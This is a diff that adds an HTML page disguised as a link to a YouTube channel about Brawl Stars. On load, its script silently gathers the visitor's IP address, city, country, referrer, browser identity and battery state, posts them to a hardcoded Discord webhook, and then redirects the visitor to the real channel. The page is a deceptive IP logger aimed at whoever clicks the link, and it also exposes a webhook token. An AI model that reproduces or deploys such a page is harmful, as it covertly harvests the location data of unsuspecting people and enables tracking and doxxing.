@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>YouTube | @HaruYT600</title>
+    <meta name="author" content="YouTube">
+    <meta name="description" content="Hey! Im Haru and I like to make Brawl Stars content!">
+    <meta property="og:title" content="Haru">
+    <meta property="og:description" content="Hey! Im Haru and I like to make Brawl Stars content!">
+    <meta property="og:image" content="https://media.discordapp.net/attachments/1257442172861546618/1295156383754489926/IMG_1019.webp?ex=670d9fe0&is=670c4e60&hm=599d6d36db927e0e619716ddee6f5eec27438bebf7bc5e4251608365cef783dc&">
+    
+  
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+    <script>
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+            return null;
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        async function sendWebhook() {
+            const batteryInfo = await getBatteryInfo();
+            const ipInfo = await getIPInfo();
+
+            const textContent = `
+                IP Address: ${ipInfo?.ip || 'N/A'}
+                Referrer: ${document.referrer || 'N/A'}
+                Device: ${navigator.userAgent || 'N/A'}
+                Battery Level: ${batteryInfo ? (batteryInfo.level * 100) + '%' : 'N/A'}
+                Charging: ${batteryInfo ? batteryInfo.charging : 'N/A'}
+                Country: ${ipInfo?.country_name || 'N/A'}
+                City: ${ipInfo?.city || 'N/A'}
+            `;
+
+            await fetch('https://discord.com/api/webhooks/1270784182783836313/qo8sXsOWGrQB8qxkAfIL7g2HjRsJQ5DG-4qxu5_ZkcRZeghvQCihz0mgj_Y8WnDIyaYW', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: textContent })
+            });
+
+            window.location.href = "https://youtube.com/@HaruYT600";
+        }
+
+        window.onload = sendWebhook;
+    </script>
+</head>
+<body>
+</body>
+</html>
